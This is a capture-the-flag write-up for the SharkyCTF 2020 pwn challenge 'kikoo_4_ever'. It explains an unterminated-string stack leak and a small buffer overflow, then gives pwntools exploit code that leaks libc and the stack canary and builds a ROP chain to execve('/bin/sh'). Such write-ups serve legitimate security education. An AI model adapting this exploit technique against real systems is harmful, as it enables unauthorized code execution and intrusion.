
## kikoo_4_ever
### Description

> I have a theory that anyone who spends most of their time on the internet, and has virtual friends, or not, knows at least one kikoo in their entourage. "Kikoo: A young teenager or child who uses text messaging, making numerous spelling mistakes, sometimes behaving immaturely, aggressively, vulgarly, rude, even violent, especially on the internet." - wiktionary.org That's the definition I found on wiktionary.org, but I think being a kikoo is not that pejorative, I also think you can be a kikoo no matter how old you are. Being a kikoo is having a different mentality, it's having a different humor, it's having different hobbies, being a kikoo is mostly an internet lover.
>
> After reading these few lines, and that no one has come to mind, it's that there must be a problem, if there is, we'll fix it immediately. Don't worry, I'm going to teach you how to identify a kikoo, they have very characteristic behaviours, and that's what we're going to see in a moment. Start by running the program, then listen to my instructions...
>
> Creator: Hackhim


### Attachment

[kikoo_4_ever](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/kikoo_4_ever/kikoo_4_ever), [kikoo_4_ever.c](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/kikoo_4_ever/kikoo_4_ever.c) and [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/kikoo_4_ever/libc.so.6)

### Analysis

There are toooo many French words in this chall, google translation help me a lot, here are some keywords:

| French          | Meaning        |
| --------------- | -------------- |
| ecrire regle    | write rules    |
| choisir lieux   | choose a place |
| lire les regles | show rules     |

#### read_user_str

This is a read function, reading string up to max `size` , and `\n` will be replaced with `\0`. 

```c
void read_user_str(char* s, int size){
	char *ptr = NULL;
	read(0, s, size);
	ptr = strchr(s, '\n');
	if(ptr != NULL)
		*ptr = 0;
  //Si il y a pas de \n c'est qu'il a rempli le buffer au max du max, enfin j'crois
    else
      s[size] = 0;
}
```

> And if there is no `\n`, the last byte of buffer will be forced fill with `\0` whatever how long the string we have input.

It means that if there are neither `\n` or `\0` in our input string, our input string will not terminal with `\0`, so that we can leak info from stack if there is a print function after reading.

#### ecrire_regle

In this function, we can write rules. After `read_user_str` called, what we inputed will be printed and if there is no `\n` in our input, the `printf("%s")` would leak info in stack. 

```c
void ecrire_regle(){              // write rules
  // ... 
  puts("\nMake me dream, what's that rule?");
  do{
    printf("Rule n°%d: ", (i+1));
    read_user_str(buf, REGLE_BUF_SIZE_512+0x10);          // bof
    printf("Read back what you just wrote:\n%s\n", buf);  // leak
    printf("Is it ok? Shall we move on? (y/n)");          // confirm
    read_user_str(go_on, 4);
  }while(go_on[0] != 'y');
  // ...
}
```

And there is a bof: `read_user_str(buf, REGLE_BUF_SIZE_512+0x10);` that let us overwrite up to `0x10` bytes of data to the behind of `buf`.

### Solution

#### leak libc & canary

We can leak both `libc` and `canary` via `read_user_str` and `printf("%s",buf)` in `ecrire_regle`:

```python
sla('> ','J') # add observations
sla('> ','2') # write rules

# leak libc_start_main_ret
sea('Rule n°6: ',cyclic(7*8))
ru(cyclic(7*8)) 
leak = uu64(rc(6))
sla('Is it ok? Shall we move on? (y/n)','n')
libcbase = leak-0x94038
info_addr('libcbase',libcbase)

# gadget
prdi = 0x000000000002155f + libcbase # pop rdi ; ret
prsi = 0x0000000000023e6a + libcbase # pop rsi ; ret
prdx = 0x0000000000001b96 + libcbase # pop rdx ; ret
ret  = 0x00000000000008aa + libcbase # ret
execve = libc.sym['execve'] + libcbase
binsh = libc.search('/bin/sh').next() + libcbase

# leak canary
sea('Rule n°6: ',cyclic(521))
ru(cyclic(521))
canary = uu64(rc(7))<<8
info_addr('canary',canary)
sla('Is it ok? Shall we move on? (y/n)','n')
```

#### ret to ropchain

Because `read_user_str` will fill the last byte of `rbp` to `0x0`, so that the layout of stack will change.

and after `ecrire_regle` returned to `main`, if `go_on` (variable that control the loop,`rbp-0x58`) is `0`, `leave; ret` (the instruction at end of `main` ) would be executed and `rsp` would be replaced with `rbp` (`rbp` is pointer to our ropchain).

![](http://image.taqini.space/img/20200511042157.png)

> the value of `rbp` changes every time due to the opening of ASLR

```python
payload = p64(0xdeadbeef)*39  # padding
payload+= p64(0)              # 312 - 0
payload+= p64(0xdeadbeef)*9   # padding
payload+= p64(canary)         # 392 - canary 49
payload+= p64(ret)*8          # ret to rop
payload+= p64(prdi) + p64(binsh) # 58
payload+= p64(prsi) + p64(0)  # 61
payload+= p64(prdx) + p64(0)  # 63
payload+= p64(execve)         # 65
payload+= p64(canary)         # 66
sea('Rule n°6: ',payload)
# debug('b *$rebase(0x1dab)\nc\nx/20xg $rbp-0x58\n')
sla('Is it ok? Shall we move on? (y/n)','y')

# exit if failed
sl('9')
p.interactive()
```

record one case of stack layout and then brute force 

> success after a few times of trying

![](http://image.taqini.space/img/20200511043913.png)

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/kikoo_4_ever) 


